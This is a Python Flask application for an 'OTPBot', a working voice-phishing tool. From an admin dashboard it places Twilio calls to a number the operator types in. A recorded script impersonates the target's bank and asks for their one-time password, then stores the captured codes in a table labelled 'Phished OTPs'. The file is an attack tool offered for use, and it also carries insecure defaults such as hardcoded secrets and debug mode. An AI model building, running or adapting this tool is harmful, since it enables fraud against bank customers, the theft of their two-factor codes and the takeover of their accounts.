import os
import sqlite3
from flask import Flask, request, redirect, url_for, render_template_string, session, flash
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "very_secret_key")

DB_FILE = "otpbot.db"

# Twilio credentials
TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID")
TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN")
TWILIO_CALLER_ID = os.environ.get("TWILIO_CALLER_ID")

# Admin credentials
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "password")

# Initialize Twilio client
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Database setup
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS otps (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            otp TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """
    )
    conn.commit()
    conn.close()

init_db()

# Home page (admin login)
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            flash("Invalid credentials", "danger")
    return render_template_string("""
        <h2>OTPBot Admin Login</h2>
        <form method="post">
            <input name="username" placeholder="Username" /><br/>
            <input name="password" type="password" placeholder="Password" /><br/>
            <button type="submit">Login</button>
        </form>
        {% with messages = get_flashed_messages(with_categories=true) %}
          {% if messages %}
            {% for category, msg in messages %}
              <p style="color:red;">{{ msg }}</p>
            {% endfor %}
          {% endif %}
        {% endwith %}
    """)

# Dashboard - view phished OTPs and trigger calls
@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT phone, otp, timestamp FROM otps ORDER BY timestamp DESC")
    otps = c.fetchall()
    conn.close()
    return render_template_string("""
        <h2>OTPBot Dashboard</h2>
        <a href="{{ url_for('logout') }}">Logout</a>
        <h3>Phished OTPs</h3>
        <table border=1>
          <tr><th>Phone</th><th>OTP</th><th>Timestamp</th></tr>
          {% for phone, otp, timestamp in otps %}
            <tr><td>{{ phone }}</td><td>{{ otp }}</td><td>{{ timestamp }}</td></tr>
          {% endfor %}
        </table>
        <h3>Trigger New Call</h3>
        <form method="post" action="{{ url_for('call') }}">
            <input name="phone" placeholder="+1234567890" required /><br/>
            <button type="submit">Call and Request OTP</button>
        </form>
    """, otps=otps)

# Logout
@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))

# Trigger a call via Twilio
@app.route("/call", methods=["POST"])
def call():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    phone = request.form.get("phone")
    # Initiate the voice call
    call = twilio_client.calls.create(
        to=phone,
        from_=TWILIO_CALLER_ID,
        url=url_for('voice', _external=True)
    )
    flash(f"Call initiated to {phone}", "success")
    return redirect(url_for("dashboard"))

# Twilio Voice Webhook: The actual phishing flow
@app.route("/voice", methods=["POST"])
def voice():
    response = VoiceResponse()
    gather = Gather(num_digits=6, action=url_for('gather_otp', _external=True), method="POST")
    gather.say("Hello. This is your bank's automated security system. Please enter your one time password now.")
    response.append(gather)
    response.say("We did not receive your input. Goodbye.")
    return str(response)

# Twilio Webhook: Gather OTP and save it
@app.route("/gather_otp", methods=["POST"])
def gather_otp():
    otp = request.values.get("Digits")
    from_number = request.values.get("From")
    if otp and from_number:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO otps (phone, otp) VALUES (?, ?)", (from_number, otp))
        conn.commit()
        conn.close()
    response = VoiceResponse()
    response.say("Thank you. Your verification is complete. Goodbye.")
    response.hangup()
    return str(response)

if __name__ == "__main__":
    app.run(debug=True)
